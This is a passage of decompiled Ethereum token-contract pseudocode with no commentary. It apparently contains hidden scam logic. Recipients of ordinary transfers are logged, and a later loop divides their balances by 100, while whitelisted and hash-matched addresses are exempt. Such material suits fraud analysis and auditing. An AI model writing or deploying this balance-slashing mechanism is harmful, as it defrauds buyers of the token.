                    return 1, mem[(17 * ceil32(return_data.size)) + 360 len 9 * ceil32(return_data.size)]
                idx = 0
                while idx < stor19.length:
                    mem[0] = stor19[idx].field_0
                    mem[32] = 13
                    _7734 = mem[64]
                    mem[64] = mem[64] + 64
                    mem[_7734] = 26
                    mem[_7734 + 32] = 'SafeMath: division by zero'
                    if idx >= stor19.length:
                        revert with 0, 50
                    mem[0] = stor19[idx].field_0
                    mem[32] = 13
                    balanceOf[stor19[idx].field_0] = balanceOf[stor19[idx].field_0] / 100
                    if idx == -1:
                        revert with 0, 17
                    idx = idx + 1
                    continue 
                stor19.length = 0
                mem[0] = 19
                idx = 0
                while 2 * stor19.length > idx:
                    stor19[idx].field_0 = 0
                    stor19[idx].field_256 = 0
                    idx = idx + 2
                    continue 
                require ext_code.size(stor10)
                staticcall stor10.factory() with:
                        gas gas_remaining wei
                mem[mem[64]] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                _11542 = mem[64]
                mem[64] = mem[64] + ceil32(return_data.size)
                require return_data.size >= 32
                _11548 = mem[_11542]
                require mem[_11542] == mem[_11542 + 12 len 20]
                require ext_code.size(stor10)
                staticcall stor10.WETH() with:
                        gas gas_remaining wei
                mem[mem[64]] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                _11566 = mem[64]
                mem[64] = mem[64] + ceil32(return_data.size)
                require return_data.size >= 32
                _11572 = mem[_11566]
                require mem[_11566] == mem[_11566 + 12 len 20]
                mem[mem[64] + 4] = this.address
                mem[mem[64] + 36] = address(_11572)
                require ext_code.size(address(_11548))
                staticcall address(_11548).getPair(address arg1, address arg2) with:
                        gas gas_remaining wei
                       args address(this.address), address(_11572)
                mem[mem[64]] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                _11590 = mem[64]
                mem[64] = mem[64] + ceil32(return_data.size)
                require return_data.size >= 32
                require mem[_11590] == mem[_11590 + 12 len 20]
                if arg1 != mem[_11590 + 12 len 20]:
                    require ext_code.size(stor10)
                    staticcall stor10.factory() with:
                            gas gas_remaining wei
                    mem[mem[64]] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    _11644 = mem[64]
                    mem[64] = mem[64] + ceil32(return_data.size)
                    require return_data.size >= 32
                    _11668 = mem[_11644]
                    require mem[_11644] == mem[_11644 + 12 len 20]
                    require ext_code.size(stor10)
                    staticcall stor10.WETH() with:
                            gas gas_remaining wei
                    mem[mem[64]] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    _11716 = mem[64]
                    mem[64] = mem[64] + ceil32(return_data.size)
                    require return_data.size >= 32
                    _11731 = mem[_11716]
                    require mem[_11716] == mem[_11716 + 12 len 20]
                    mem[mem[64] + 4] = this.address
                    mem[mem[64] + 36] = address(_11731)
                    require ext_code.size(address(_11668))
                    staticcall address(_11668).getPair(address arg1, address arg2) with:
                            gas gas_remaining wei
                           args address(this.address), address(_11731)
                    mem[mem[64]] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    _11821 = mem[64]
                    mem[64] = mem[64] + ceil32(return_data.size)
                    require return_data.size >= 32
                    _11881 = mem[_11821]
                    require mem[_11821] == mem[_11821 + 12 len 20]
                    if mem[_11821 + 12 len 20] != msg.sender:
                        if stor16[address(msg.sender)]:
                            if arg2 < 0:
                                revert with 0, 17
                            if balanceOf[0] > -1:
                                revert with 0, 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 0, 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[arg1] > !arg2:
                                revert with 0, 17
                            balanceOf[arg1] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            mem[0] = arg1
                            mem[32] = 16
                            if stor16[address(arg1)]:
                                if arg2 < 0:
                                    revert with 0, 17
                                if balanceOf[0] > -1:
                                    revert with 0, 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !arg2:
                                    revert with 0, 17
                                balanceOf[arg1] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[mem[64] + 32] = address(arg1)
                                _12137 = mem[64]
                                mem[mem[64]] = 20
                                mem[64] = mem[64] + 52
                                if 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba == sha3(mem[_12137 + 32 len mem[_12137]]):
                                    if arg2 < 0:
                                        revert with 0, 17
                                    if balanceOf[0] > -1:
                                        revert with 0, 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 0, 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[arg1] > !arg2:
                                        revert with 0, 17
                                    balanceOf[arg1] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    if this.address == arg1:
                                        if arg2 < 0:
                                            revert with 0, 17
                                        if balanceOf[0] > -1:
                                            revert with 0, 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 0, 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[arg1] > !arg2:
                                            revert with 0, 17
                                        balanceOf[arg1] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if msg.sender == address(_11881):
                                            if arg2 < 0:
                                                revert with 0, 17
                                            if balanceOf[0] > -1:
                                                revert with 0, 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 0, 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[arg1] > !arg2:
                                                revert with 0, 17
                                            balanceOf[arg1] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if stor18:
                                                if arg2 < 0:
                                                    revert with 0, 17
                                                if balanceOf[0] > -1:
                                                    revert with 0, 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 0, 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[arg1] > !arg2:
                                                    revert with 0, 17
                                                balanceOf[arg1] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if not arg2:
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(stor10)
                                                    staticcall stor10.factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(stor10)
                                                    staticcall stor10.WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor19.length++
                                                        stor19[stor19.length].field_0 = arg1
                                                        stor66DE[stor19.length] = arg2
                                                    if arg2 < 0:
                                                        revert with 0, 17
                                                    if balanceOf[0] > -1:
                                                        revert with 0, 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 0, 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[arg1] > !arg2:
                                                        revert with 0, 17
                                                    balanceOf[arg1] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if arg2 and _fee > -1 / arg2:
                                                        revert with 0, 17
                                                    if not arg2:
                                                        revert with 0, 18
                                                    if arg2 * _fee / arg2 != _fee:
                                                        revert with 0, 'SafeMath: multiplication overflow'
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(stor10)
                                                    staticcall stor10.factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(stor10)
                                                    staticcall stor10.WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor19.length++
                                                        stor19[stor19.length].field_0 = arg1
                                                        stor66DE[stor19.length] = arg2
                                                    if arg2 < arg2 * _fee / 100:
                                                        revert with 0, 17
                                                    if balanceOf[0] > !(arg2 * _fee / 100):
                                                        revert with 0, 17
                                                    balanceOf[0] += arg2 * _fee / 100
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 0, 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[arg1] > !(arg2 - (arg2 * _fee / 100)):
                                                        revert with 0, 17
                                                    balanceOf[arg1] = balanceOf[arg1] + arg2 - (arg2 * _fee / 100)
                                                    emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                    if arg2 * _fee / 100:
                                                        emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                    else:
                        if stor16[address(msg.sender)]:
                            if arg2 < 0:
                                revert with 0, 17
                            if balanceOf[0] > -1:
                                revert with 0, 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 0, 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[arg1] > !arg2:
                                revert with 0, 17
                            balanceOf[arg1] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            mem[0] = arg1
                            mem[32] = 16
                            if stor16[address(arg1)]:
                                if arg2 < 0:
                                    revert with 0, 17
                                if balanceOf[0] > -1:
                                    revert with 0, 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !arg2:
                                    revert with 0, 17
                                balanceOf[arg1] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[mem[64] + 32] = address(arg1)
                                _12185 = mem[64]
                                mem[mem[64]] = 20
                                mem[64] = mem[64] + 52
                                if 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba == sha3(mem[_12185 + 32 len mem[_12185]]):
                                    if arg2 < 0:
                                        revert with 0, 17
                                    if balanceOf[0] > -1:
                                        revert with 0, 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 0, 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[arg1] > !arg2:
                                        revert with 0, 17
                                    balanceOf[arg1] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    if this.address == arg1:
                                        if arg2 < 0:
                                            revert with 0, 17
                                        if balanceOf[0] > -1:
                                            revert with 0, 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 0, 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[arg1] > !arg2:
                                            revert with 0, 17
                                        balanceOf[arg1] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if stor16[address(arg1)]:
                                            if arg2 < 0:
                                                revert with 0, 17
                                            if balanceOf[0] > -1:
                                                revert with 0, 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 0, 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[arg1] > !arg2:
                                                revert with 0, 17
                                            balanceOf[arg1] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if stor18:
                                                if arg2 < 0:
                                                    revert with 0, 17
                                                if balanceOf[0] > -1:
                                                    revert with 0, 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 0, 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[arg1] > !arg2:
                                                    revert with 0, 17
                                                balanceOf[arg1] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if not arg2:
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(stor10)
                                                    staticcall stor10.factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(stor10)
                                                    staticcall stor10.WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor19.length++
                                                        stor19[stor19.length].field_0 = arg1
                                                        stor66DE[stor19.length] = arg2
                                                    if arg2 < 0:
                                                        revert with 0, 17
                                                    if balanceOf[0] > -1:
                                                        revert with 0, 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 0, 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[arg1] > !arg2:
                                                        revert with 0, 17
                                                    balanceOf[arg1] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if arg2 and _fee > -1 / arg2:
                                                        revert with 0, 17
                                                    if not arg2:
                                                        revert with 0, 18
                                                    if arg2 * _fee / arg2 != _fee:
                                                        revert with 0, 'SafeMath: multiplication overflow'
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(stor10)
                                                    staticcall stor10.factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(stor10)
                                                    staticcall stor10.WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor19.length++
                                                        stor19[stor19.length].field_0 = arg1
                                                        stor66DE[stor19.length] = arg2
                                                    if arg2 < arg2 * _fee / 100:
                                                        revert with 0, 17
                                                    if balanceOf[0] > !(arg2 * _fee / 100):
                                                        revert with 0, 17
                                                    balanceOf[0] += arg2 * _fee / 100
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 0, 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[arg1] > !(arg2 - (arg2 * _fee / 100)):
                                                        revert with 0, 17
                                                    balanceOf[arg1] = balanceOf[arg1] + arg2 - (arg2 * _fee / 100)
                                                    emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                    if arg2 * _fee / 100:
                                                        emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                else:
                    mem[0] = msg.sender
                    mem[32] = 16
                    if stor16[address(msg.sender)]:
                        if stor16[address(msg.sender)]:
                            if arg2 < 0:
                                revert with 0, 17
                            if balanceOf[0] > -1:
                                revert with 0, 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 0, 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[arg1] > !arg2:
                                revert with 0, 17
                            balanceOf[arg1] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            mem[0] = arg1
                            mem[32] = 16
                            if stor16[address(arg1)]:
                                if arg2 < 0:
                                    revert with 0, 17
                                if balanceOf[0] > -1:
                                    revert with 0, 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !arg2:
                                    revert with 0, 17
                                balanceOf[arg1] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[mem[64] + 32] = address(arg1)
                                _11670 = mem[64]
                                mem[mem[64]] = 20
                                mem[64] = mem[64] + 52
                                if 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba == sha3(mem[_11670 + 32 len mem[_11670]]):
                                    if arg2 < 0:
                                        revert with 0, 17
                                    if balanceOf[0] > -1:
                                        revert with 0, 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 0, 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[arg1] > !arg2:
                                        revert with 0, 17
                                    balanceOf[arg1] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    if this.address == arg1:
                                        if arg2 < 0:
                                            revert with 0, 17
                                        if balanceOf[0] > -1:
                                            revert with 0, 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 0, 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[arg1] > !arg2:
                                            revert with 0, 17
                                        balanceOf[arg1] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if stor16[address(msg.sender)]:
                                            if arg2 < 0:
                                                revert with 0, 17
                                            if balanceOf[0] > -1:
                                                revert with 0, 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 0, 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[arg1] > !arg2:
                                                revert with 0, 17
                                            balanceOf[arg1] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if stor18:
                                                if arg2 < 0:
                                                    revert with 0, 17
                                                if balanceOf[0] > -1:
                                                    revert with 0, 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 0, 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[arg1] > !arg2:
                                                    revert with 0, 17
                                                balanceOf[arg1] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if not arg2:
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(stor10)
                                                    staticcall stor10.factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(stor10)
                                                    staticcall stor10.WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor19.length++
                                                        stor19[stor19.length].field_0 = arg1
                                                        stor66DE[stor19.length] = arg2
                                                    if arg2 < 0:
                                                        revert with 0, 17
                                                    if balanceOf[0] > -1:
                                                        revert with 0, 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 0, 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[arg1] > !arg2:
                                                        revert with 0, 17
                                                    balanceOf[arg1] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if arg2 and _fee > -1 / arg2:
                                                        revert with 0, 17
                                                    if not arg2:
                                                        revert with 0, 18
                                                    if arg2 * _fee / arg2 != _fee:
                                                        revert with 0, 'SafeMath: multiplication overflow'
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(stor10)
                                                    staticcall stor10.factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(stor10)
                                                    staticcall stor10.WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor19.length++
                                                        stor19[stor19.length].field_0 = arg1
                                                        stor66DE[stor19.length] = arg2
                                                    if arg2 < arg2 * _fee / 100:
                                                        revert with 0, 17
                                                    if balanceOf[0] > !(arg2 * _fee / 100):
                                                        revert with 0, 17
                                                    balanceOf[0] += arg2 * _fee / 100
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 0, 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[arg1] > !(arg2 - (arg2 * _fee / 100)):
                                                        revert with 0, 17
                                                    balanceOf[arg1] = balanceOf[arg1] + arg2 - (arg2 * _fee / 100)
                                                    emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                    if arg2 * _fee / 100:
                                                        emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                    else:
                        require ext_code.size(stor10)
                        staticcall stor10.factory() with:
                                gas gas_remaining wei
                        mem[mem[64]] = ext_call.return_data[0]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        _11650 = mem[64]
                        mem[64] = mem[64] + ceil32(return_data.size)
                        require return_data.size >= 32
                        _11686 = mem[_11650]
                        require mem[_11650] == mem[_11650 + 12 len 20]
                        require ext_code.size(stor10)
                        staticcall stor10.WETH() with:
                                gas gas_remaining wei
                        mem[mem[64]] = ext_call.return_data[0]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        _11722 = mem[64]
                        mem[64] = mem[64] + ceil32(return_data.size)
                        require return_data.size >= 32
                        _11744 = mem[_11722]
                        require mem[_11722] == mem[_11722 + 12 len 20]
                        mem[mem[64] + 4] = this.address
                        mem[mem[64] + 36] = address(_11744)
                        require ext_code.size(address(_11686))
                        staticcall address(_11686).getPair(address arg1, address arg2) with:
                                gas gas_remaining wei
                               args address(this.address), address(_11744)
                        mem[mem[64]] = ext_call.return_data[0]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        _11856 = mem[64]
                        mem[64] = mem[64] + ceil32(return_data.size)
                        require return_data.size >= 32
                        _11904 = mem[_11856]
                        require mem[_11856] == mem[_11856 + 12 len 20]
                        if mem[_11856 + 12 len 20] != msg.sender:
                            if stor16[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 0, 17
                                if balanceOf[0] > -1:
                                    revert with 0, 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !arg2:
                                    revert with 0, 17
                                balanceOf[arg1] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[0] = arg1
                                mem[32] = 16
                                if stor16[address(arg1)]:
                                    if arg2 < 0:
                                        revert with 0, 17
                                    if balanceOf[0] > -1:
                                        revert with 0, 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 0, 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[arg1] > !arg2:
                                        revert with 0, 17
                                    balanceOf[arg1] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    mem[mem[64] + 32] = address(arg1)
                                    _12190 = mem[64]
                                    mem[mem[64]] = 20
                                    mem[64] = mem[64] + 52
                                    if 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba == sha3(mem[_12190 + 32 len mem[_12190]]):
                                        if arg2 < 0:
                                            revert with 0, 17
                                        if balanceOf[0] > -1:
                                            revert with 0, 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 0, 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[arg1] > !arg2:
                                            revert with 0, 17
                                        balanceOf[arg1] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if this.address == arg1:
                                            if arg2 < 0:
                                                revert with 0, 17
                                            if balanceOf[0] > -1:
                                                revert with 0, 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 0, 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[arg1] > !arg2:
                                                revert with 0, 17
                                            balanceOf[arg1] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if msg.sender == address(_11904):
                                                if arg2 < 0:
                                                    revert with 0, 17
                                                if balanceOf[0] > -1:
                                                    revert with 0, 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 0, 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[arg1] > !arg2:
                                                    revert with 0, 17
                                                balanceOf[arg1] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if stor18:
                                                    if arg2 < 0:
                                                        revert with 0, 17
                                                    if balanceOf[0] > -1:
                                                        revert with 0, 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 0, 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[arg1] > !arg2:
                                                        revert with 0, 17
                                                    balanceOf[arg1] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if not arg2:
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(stor10)
                                                        staticcall stor10.factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(stor10)
                                                        staticcall stor10.WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor19.length++
                                                            stor19[stor19.length].field_0 = arg1
                                                            stor66DE[stor19.length] = arg2
                                                        if arg2 < 0:
                                                            revert with 0, 17
                                                        if balanceOf[0] > -1:
                                                            revert with 0, 17
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 0, 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[arg1] > !arg2:
                                                            revert with 0, 17
                                                        balanceOf[arg1] += arg2
                                                        emit Transfer(arg2, msg.sender, arg1);
                                                    else:
                                                        if arg2 and _fee > -1 / arg2:
                                                            revert with 0, 17
                                                        if not arg2:
                                                            revert with 0, 18
                                                        if arg2 * _fee / arg2 != _fee:
                                                            revert with 0, 'SafeMath: multiplication overflow'
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(stor10)
                                                        staticcall stor10.factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(stor10)
                                                        staticcall stor10.WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
